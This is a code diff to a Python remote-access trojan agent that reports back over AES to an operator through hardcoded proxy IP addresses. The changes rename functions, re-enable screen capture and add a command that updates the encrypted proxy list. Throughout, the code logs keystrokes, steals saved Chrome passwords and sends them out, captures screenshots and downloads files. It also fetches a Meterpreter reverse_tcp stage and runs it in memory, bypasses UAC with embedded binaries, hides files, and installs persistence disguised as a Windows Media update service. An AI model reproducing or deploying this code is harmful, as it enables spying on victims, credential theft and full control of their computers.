@@ -1,22 +1,23 @@
-#def fscreenshot():
-# 	hwnd = 0
-# 	hwndDC = win32gui.GetWindowDC(hwnd)
-# 	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
-# 	saveDC = mfcDC.CreateCompatibleDC()
-# 	saveBitMap = win32ui.CreateBitmap()
-# 	MoniterDev = win32api.EnumDisplayMonitors(None,None)
-# 	w = MoniterDev[0][2][2]
-# 	h = MoniterDev[0][2][3]
-# 	saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
-# 	saveDC.SelectObject(saveBitMap)
-# 	saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)
-# 	bmpname=win32api.GetTempFileName(".","")[0]+'.bmp'
-# 	saveBitMap.SaveBitmapFile(saveDC, bmpname)
-# 	mfcDC.DeleteDC()
-# 	saveDC.DeleteDC()
-# 	win32gui.ReleaseDC(hwnd, hwndDC)
-# 	win32gui.DeleteObject(saveBitMap.GetHandle())
-# 	return bmpname
+def fscreenshot():
+	hwnd = 0
+	hwndDC = win32gui.GetWindowDC(hwnd)
+	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
+	saveDC = mfcDC.CreateCompatibleDC()
+	saveBitMap = win32ui.CreateBitmap()
+	MoniterDev = win32api.EnumDisplayMonitors(None,None)
+	w = MoniterDev[0][2][2]
+	h = MoniterDev[0][2][3]
+	saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
+	saveDC.SelectObject(saveBitMap)
+	saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)
+	bmpname=win32api.GetTempFileName(".","")[0]+'.bmp'
+	saveBitMap.SaveBitmapFile(saveDC, bmpname)
+	mfcDC.DeleteDC()
+	saveDC.DeleteDC()
+	win32gui.ReleaseDC(hwnd, hwndDC)
+	win32gui.DeleteObject(saveBitMap.GetHandle())
+	fsubprocess('del *.tmp')
+	return bmpname
 
 def fconnect():
 	global s, success, pconnect
@@ -34,7 +35,6 @@ def fconnect():
 					break
 				except:
 					pass
-
 	else:
 		while not pconnect:
 			try:
@@ -47,9 +47,9 @@ def fconnect():
 	s.send(success)
 	s.settimeout(999)
 
-def Wget(dfile):
-	down = urllib2.urlopen(dfile)
-	filename = dfile.split('/')[-1]
+def fwget(url):
+	down = urllib2.urlopen(url)
+	filename = url.split('/')[-1]
 	with open(pwd.strip('**r') + os.sep + filename,'wb') as o:
 		o.write(down.read())
 
@@ -66,7 +66,7 @@ def fpersist():
 	vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
 	with open(vbsdst, 'w') as pv:
 		pv.write(vbscript)
-	win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
+	fsubprocess('attrib +h ' + vbsdst)
 	cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
 	cmds += 'sc create %s binPath= "cmd.exe /c wscript.exe ' % (servicename) + vbsdst + '" type= own start= auto**n'
 	cmds += 'del ' + tempvbs + '**n'
@@ -77,14 +77,14 @@ def fpersist():
 		hid.write(hb)
 	with open(tempbat, 'w') as cbat:
 		cbat.write(cmds)
-	win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
-	win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
+	fsubprocess('attrib +h ' + tempvbs)
+	fsubprocess('attrib +h ' + tempbat)
 	rcmd = tempvbs + ' ' + tempbat
 	fbypass(rcmd)
 	fsubprocess('taskkill /f /im ' + sys.argv[0])
-	exit()
+	sys.exit()
 
-def MeterDrop(mhost, mport):
+def fmeterdrop(mhost, mport):
 	try:
 		global DropSock
 		DropSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -99,7 +99,7 @@ def MeterDrop(mhost, mport):
 		return HNzdFhkeybuffervICp
 	except: return None
 
-def ExecInMem(shellcode):
+def fexecinmem(shellcode):
 	if shellcode != None:
 		iNGRgaQLVJ = bytearray(shellcode)
 		imHlcWqpKVwgodv = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(iNGRgaQLVJ)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
@@ -112,7 +112,7 @@ def ExecInMem(shellcode):
 def frunthis(cmd):
 	os.popen(cmd)
 
-def pressed_chars(event):   
+def fkeypress(event):   
 	global keydump
 	if event.Ascii:
 		char = chr(event.Ascii) 
@@ -120,51 +120,48 @@ def pressed_chars(event):
 			keydump += "**n"
 		elif event.Ascii == 8:
 			keydump += "[Backspace]"
-		elif event.Ascii== 9:
+		elif event.Ascii == 9:
 			keydump += "[Tab]"
-		elif event.Ascii== 16:
+		elif event.Ascii == 16:
 			keydump += "[Shift]"
-		elif event.Ascii== 17:
+		elif event.Ascii == 17:
 			keydump += "[Control]"
-		elif event.Ascii== 27:
+		elif event.Ascii == 27:
 			keydump += "[Escape]"
-		elif event.Ascii== 35:
+		elif event.Ascii == 35:
 			keydump += "[End]"
-		elif event.Ascii== 36:
+		elif event.Ascii == 36:
 			keydump += "[Home]"
-		elif event.Ascii== 37:
+		elif event.Ascii == 37:
 			 keydump += "[Left]"
-		elif event.Ascii== 38:
+		elif event.Ascii == 38:
 			keydump += "[UP]"
-		elif event.Ascii== 39:
+		elif event.Ascii == 39:
 			keydump += "[Right]"
-		elif event.Ascii== 40:
+		elif event.Ascii == 40:
 			keydump += "[Down]"
 		else:
 			if char in string.printable:
 				keydump += char
 
-def klloop():
-	try:
-		proc = pyHook.HookManager()     
-		proc.KeyDown = pressed_chars    
-		proc.HookKeyboard()           
-		pythoncom.PumpMessages()       
-	except:
-		return 0
+def fkeylog():
+	proc = pyHook.HookManager()    
+	proc.KeyDown = fkeypress
+	proc.HookKeyboard()
+	pythoncom.PumpMessages()
 
 def fbypass(cmd):
-		with open(bypassexe, 'wb') as uac:
-			if is64:
-				uac.write(bypass64exe.decode('base64'))
-			else:
-				uac.write(bypass86exe.decode('base64'))
-		win32api.SetFileAttributes(bypassexe,win32con.FILE_ATTRIBUTE_HIDDEN)
-		rcmd = bypassexe + ' elevate /c ' + cmd
-		back = fsubprocess(rcmd)
-		os.remove(bypassexe)
-		os.remove(os.sep.join(bypassexe.split(os.sep)[:-1]) + os.sep + 'tior.exe')
-		return back
+	with open(bypassexe, 'wb') as uac:
+		if is64:
+			uac.write(bypass64exe.decode('base64'))
+		else:
+			uac.write(bypass86exe.decode('base64'))
+	fsubprocess('attrib +h ' + bypassexe)
+	rcmd = bypassexe + ' elevate /c ' + cmd
+	back = fsubprocess(rcmd)
+	os.remove(bypassexe)
+	os.remove(os.sep.join(bypassexe.split(os.sep)[:-1]) + os.sep + 'tior.exe')
+	return back
 
 def fsubprocess(cmd):
 	if ushell:
@@ -172,7 +169,7 @@ def fsubprocess(cmd):
 	out = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	return out.stdout.read() + out.stderr.read()
 
-def sendAES(data):
+def fremoteprint(data):
 	data = data + '**nEOFEOFEOFEOFEOFX'
 	encrypted = EncodeAES(cipher, data)
 	s.send(encrypted)
@@ -214,6 +211,7 @@ if os.name == 'nt':
 	vbsdst = os.getenv('APPDATA') + '%s..%sLocal%sWindowsMediaUpdate.vbs' % (os.sep, os.sep, os.sep) 
 	servicename = '"' + 'Windows Media Center Update Service' + '"'
 	servicedisc = '"' + 'Windows Media Center Update Service for installation, modification, and removal of Windows updates and optional components. If this service is disabled, install or uninstall of Windows updates might fail for this computer.' + '"'
+	proxyfile = os.getenv('TEMP') + os.sep + 'xmlrpc.dat'
 
 	#																								  #
 	###################################################################################################
@@ -232,7 +230,7 @@ if os.name == 'nt':
 
 	if isSystem:
 		try:
-			win32api.SetFileAttributes(agent,win32con.FILE_ATTRIBUTE_HIDDEN)
+			fsubprocess('attrib +h ' + agent)
 		except:
 			pass
 ***PERSIST***
@@ -275,6 +273,14 @@ else:
 	paddedpwd = pwd + '*' * (64 - len(pwd))
 	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s%s' % (paddedopsys, paddedpwd, starpadding))
 
+
+try:
+	proxies = []
+	with open(proxyfile) as pl:
+		decpl = DecodeAES(cipher, pl.read())
+	for line in decpl.split('**n'):
+		proxies.append([line.split(':')[0], int(line.split(':')[1])])
+except:
 	#################################################################################################################
 
                                # HTTP PROXY SETTINGS - proxies can only be HTTP/S !
@@ -282,8 +288,8 @@ else:
 							   # Add as many proxies as you want below, the script will
 							   # try them all in order in a loop until it connects.
 
-proxies = [["37.187.58.37", 3128], ["188.40.252.215", 7808], ["65.49.14.147", 3080], ["188.40.252.215", 3127], ["64.31.22.143", 8089],
-		  ["108.165.33.7", 3128], ["108.165.33.12", 3128], ["104.140.67.36", 8089], ["108.165.33.4", 3128]] 
+	proxies = [["37.187.58.37", 3128], ["188.40.252.215", 7808], ["65.49.14.147", 3080], ["188.40.252.215", 3127], ["64.31.22.143", 8089],
+			  ["108.165.33.7", 3128], ["108.165.33.12", 3128], ["104.140.67.36", 8089], ["108.165.33.4", 3128]] 
 
 	#################################################################################################################
 
@@ -294,36 +300,46 @@ fconnect()
 
 while True:
 	try:
-		data = s.recv(2048)
+		data = s.recv(8192)
 		decrypted = DecodeAES(cipher, data)
 	except:
 		fconnect()
 		decrypted = 'donaught'
 
-	for char in decrypted:
-		if char not in string.printable:
-			encrypted = EncodeAES(cipher, starpadding * 3 + '^^')
-			s.send(encrypted)
-			decrypted = 'donaught'
-			break
-
 	if decrypted == "quit" or decrypted == "exit":
 		s.close()
-		fsubprocess('taskkill /f /im ' + sys.argv[0])
-		exit()
+		sys.exit()
 
 	elif decrypted == 'donaught':
 		pass
 
-	# elif decrypted.startswith('screenshot'):
-	# 	upfile = fscreenshot()
-	# 	with open(upfile, 'rb') as f:
-	# 		encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
-	# 	s.send(encrypted)
-	# 	os.remove(upfile)
+	elif decrypted.startswith('screenshot'):
+		upfile = fscreenshot()
+		with open(upfile, 'rb') as f:
+			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
+		s.send(encrypted)
+		os.remove(upfile)
 
 	elif decrypted.startswith("tempsend "):
-		sendAES(ftempsend(decrypted.split(' ')[1]))
+		fremoteprint(ftempsend(decrypted.split(' ')[1]))
+
+	elif decrypted.startswith('proxyupdate'):
+		proxlist = decrypted[11:]
+		if decrypted.endswith('EOPL'):
+			proxlist = proxlist[:-4]
+		else:
+			while not decrypted.endswith('EOPL'):
+				data = s.recv(8192)
+				decrypted = DecodeAES(cipher, data)
+				if decrypted.endswith('EOPL'):
+					proxlist += decrypted[:-4]
+					break
+				else:
+					proxlist += decrypted
+		with open(proxyfile, 'wb') as pl:
+			pl.write(EncodeAES(cipher, proxlist))
+		encrypted = EncodeAES(cipher, 'WTFWTFWTFWTFWTF1WTFWTFWTFWTFWTF1 [*] New proxy list stored at %s**n' % (proxyfile))
+		s.send(encrypted)
 
 	elif decrypted.startswith("chromepass"):
 		if pwdvar == 'cd':
@@ -362,33 +378,33 @@ while True:
 						sendit += sendpass
 					else:
 						sendit += '**n [X] No passwords found for %s.**n' % (passpath[1])
-				sendAES(sendit)
+				fremoteprint(sendit)
 			else:
-				sendAES(' [X] Chrome, Chromium and Aviator are not installed.')
+				fremoteprint(' [X] Chrome, Chromium and Aviator are not installed.')
 		else:
-			sendAES(" [X] Error: chromepass command is only available on windows.")
+			fremoteprint(" [X] Error: chromepass command is only available on windows.")
 
 	elif decrypted.startswith("keydump"):
-		sendAES(keydump)
+		fremoteprint(keydump)
 
 	elif decrypted.startswith("keyscan"):
-		kl = threading.Thread(target = klloop)
+		kl = threading.Thread(target = fkeylog)
 		kl.start()
-		sendAES(" [*] Keylogging started.")
+		fremoteprint(" [*] Keylogging started.")
 
 	elif decrypted.startswith("keyclear"):
-		sendAES("%s**n [*] Keybuffer cleared." % (keydump))
+		fremoteprint("%s**n [*] Keybuffer cleared." % (keydump))
 		keydump = ''
 
 	elif decrypted.startswith("meterpreter "):
 		try:
 			mhost,mport = decrypted.split(' ')[1].split(':')
-			MeterBin = MeterDrop(mhost, mport)
-			sendAES(" [*] Meterpreter reverse_tcp sent to %s:%s" % (mhost, mport))
-			t = threading.Thread(target = ExecInMem, args = (MeterBin , ))
+			MeterBin = fmeterdrop(mhost, mport)
+			fremoteprint(" [*] Meterpreter reverse_tcp sent to %s:%s" % (mhost, mport))
+			t = threading.Thread(target = fexecinmem, args = (MeterBin , ))
 			t.start()
 		except:
-			sendAES(" [X] Failed to load meterpreter.**n   e.g: meterpreter 192.168.1.20:4444")
+			fremoteprint(" [X] Failed to load meterpreter.**n   e.g: meterpreter 192.168.1.20:4444")
 
 	elif decrypted.startswith("persistence"):
 		if os.name == 'nt':
@@ -410,11 +426,11 @@ while True:
 						if out.find("BUILTIN" + os.sep + "Users:(I)(F)") != -1 or out.find("BUILTIN" + os.sep + "Users:(F)") != -1:
 							vulnpaths += line + '**n'
 				if vulnpaths:
-					sendAES(" [*] Windows services with weak directory permissions:**n**n%s" % (vulnpaths))
+					fremoteprint(" [*] Windows services with weak directory permissions:**n**n%s" % (vulnpaths))
 				else:
-					sendAES(" [X] No services with weak directory permissions found.")
+					fremoteprint(" [X] No services with weak directory permissions found.")
 		else:
-			sendAES(" [X] Persistence is only available for windows.")
+			fremoteprint(" [X] Persistence is only available for windows.")
 
 	elif decrypted.startswith("bypassuac "):
 		cmds = ' '.join(decrypted.split(' ')[1:])
@@ -434,48 +450,60 @@ while True:
 	elif decrypted.startswith("wget "):
 		try:
 			url = decrypted.split(' ')[1]
-			Wget(url)
-			sendAES(" [*] %s downloaded." % (url.split('/')[-1]))
+			fwget(url)
+			fremoteprint(" [*] %s downloaded." % (url.split('/')[-1]))
 		except:
-			sendAES(" [X] Could not download %s." % (url))
+			fremoteprint(" [X] Could not download %s." % (url))
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):													## Data starting with this code indicates we are to receive a file
 		try:
-			ufilename = pwd.strip('**r') + os.sep + decrypted[16:32].strip('*')
+			ufilename = pwd.strip('**r') + os.sep + decrypted[32:48].strip('*')
+			decrypted = decrypted[48:]
 			f = open(ufilename, 'wb')
-			f.write(decrypted[32:])
-			while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-				data = s.recv(2048)
-				decrypted = DecodeAES(cipher, data)
-				if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-					f.write(decrypted[:-16])
-				else:
-					f.write(decrypted)
+			if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+				decrypted = decrypted[:-32]
+				f.write(decrypted)
+			else:
+				f.write(decrypted)
+				while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+					data = s.recv(8192)
+					decrypted = DecodeAES(cipher, data)
+					if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+						f.write(decrypted[:-32])
+					else:
+						f.write(decrypted)
 			f.close()
-			sendAES(" [*] File uploaded to %s" % (ufilename))
+			fremoteprint(" [*] File uploaded to %s" % (ufilename))
 		except Exception as e:
-			sendAES(" [*] Something went wrong: %s" % (e))
+			fremoteprint(" [*] Something went wrong: %s" % (e))
 
 	elif decrypted.startswith('run '):
 		cmd = 'cd ' + pwd + '&&' + ' '.join(decrypted.split(' ')[1:]) 
 		t = threading.Thread(target = frunthis, args = (cmd , ))
 		t.start()
-		sendAES(' [*] Executed "' + ' '.join(decrypted.split(' ')[1:]) + '" in ' + pwd)
+		fremoteprint(' [*] Executed "' + ' '.join(decrypted.split(' ')[1:]) + '" in ' + pwd)
 
 	else:
-		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)												## This is how we maintain pwd
-		stdout = fsubprocess(cmd)
-		try:
-			checkpath = stdout.split('**n')[-2].strip('**n').strip('**r')
-			if os.path.exists(checkpath):
-				pwd = checkpath
-		except:
-			pass
-		result = '**n'.join(stdout.split('**n')[:-1])
-		try:
-			sendAES(result)
-		except:
-			fconnect()
+		for char in decrypted:
+			if char not in string.printable:
+				encrypted = EncodeAES(cipher, starpadding * 3 + '^^')
+				s.send(encrypted)
+				decrypted = 'donaught'
+				break
+		if decrypted != 'donaught':
+			cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)												## This is how we maintain pwd
+			stdout = fsubprocess(cmd)
+			try:
+				checkpath = stdout.split('**n')[-2].strip('**n').strip('**r')
+				if os.path.exists(checkpath):
+					pwd = checkpath
+			except:
+				pass
+			result = '**n'.join(stdout.split('**n')[:-1])
+			try:
+				fremoteprint(result)
+			except:
+				fconnect()
 
 s.close()
 ***JUNK***
